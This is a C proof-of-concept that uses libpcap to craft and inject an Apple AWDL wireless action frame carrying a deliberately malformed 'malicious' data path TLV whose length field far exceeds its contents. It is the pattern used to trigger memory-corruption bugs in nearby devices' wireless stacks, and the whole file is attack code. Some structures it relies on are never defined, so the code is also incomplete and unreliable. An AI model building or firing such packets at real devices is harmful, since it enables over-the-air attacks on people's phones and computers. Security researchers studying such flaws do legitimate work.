#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <pcap.h>

#define DATA_PATH_TLV_TYPE 0x0C
#define UNICAST_DATA_PATH_TLV_TYPE 0x0C

struct data_path_tlv {
    uint8_t type;
    uint16_t length;
    uint16_t flags;
    char country_code[3];
    uint16_t social_channels;
    uint8_t awdl_addr[6];
    uint16_t ext_flags;
} __attribute__((packed));

struct unicast_data_path_tlv {
    uint8_t type;
    uint16_t length;
    uint16_t flags;
    uint8_t country_code[3];
    uint16_t social_channel_map;
    uint8_t infra_bssid[6];
    uint16_t infra_channel;
    uint8_t infra_addr[6];
    uint8_t awdl_addr[6];
    uint32_t unicast_options;
} __attribute__((packed));

void inject_tlv(pcap_t *pcap, const struct ether_addr *dst_mac, const struct ether_addr *src_mac, void *tlv, size_t tlv_size) {
    // IEEE 802.11 frame header
    struct ieee80211_hdr hdr = {0};
    hdr.frame_control = 0x00D0; // Management frame, Action subtype
    memcpy(&hdr.dst_addr, dst_mac, sizeof(struct ether_addr));
    memcpy(&hdr.src_addr, src_mac, sizeof(struct ether_addr));
    memcpy(&hdr.bssid_addr, src_mac, sizeof(struct ether_addr)); // Usually same as src for AWDL

    // AWDL action frame header (simplified)
    struct awdl_action action = {0};
    action.category = 127; // Vendor-specific
    action.oui[0] = 0x00; action.oui[1] = 0x17; action.oui[2] = 0xF2; // Apple's OUI
    action.type = 8; // AWDL type
    action.version = 1; // Version
    action.subtype = 0; // PSF or MIF

    // Allocate memory for the packet
    size_t packet_size = sizeof(struct ieee80211_hdr) + sizeof(struct awdl_action) + tlv_size;
    uint8_t *packet = (uint8_t *)malloc(packet_size);
    if (!packet) {
        fprintf(stderr, "Memory allocation failed\n");
        return;
    }

    // Construct packet
    memcpy(packet, &hdr, sizeof(struct ieee80211_hdr));
    memcpy(packet + sizeof(struct ieee80211_hdr), &action, sizeof(struct awdl_action));
    memcpy(packet + sizeof(struct ieee80211_hdr) + sizeof(struct awdl_action), tlv, tlv_size);

    // Inject packet
    if (pcap_inject(pcap, packet, packet_size) == -1) {
        fprintf(stderr, "Failed to inject packet: %s\n", pcap_geterr(pcap));
    } else {
        printf("Packet injected successfully\n");
    }

    free(packet);
}
int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <interface> <destination_mac>\n", argv[0]);
        return 1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live() failed: %s\n", errbuf);
        return 1;
    }

    struct ether_addr dst_mac, src_mac;
    ether_aton_r(argv[2], &dst_mac);
    memcpy(&src_mac, "\x00\x17\xf2\x00\x00\x01", sizeof(struct ether_addr)); // Example source MAC

    // Prepare malicious TLV
    struct data_path_tlv dp = {0};
    dp.type = DATA_PATH_TLV_TYPE;
    dp.length = 0x1000; // Example: Much larger than actual data
    strcpy(dp.country_code, "US");
    dp.social_channels = 1;
    memcpy(dp.awdl_addr, src_mac.ether_addr_octet, 6);

    inject_tlv(pcap, &dst_mac, &src_mac, &dp, sizeof(dp));

    pcap_close(pcap);
    return 0;
}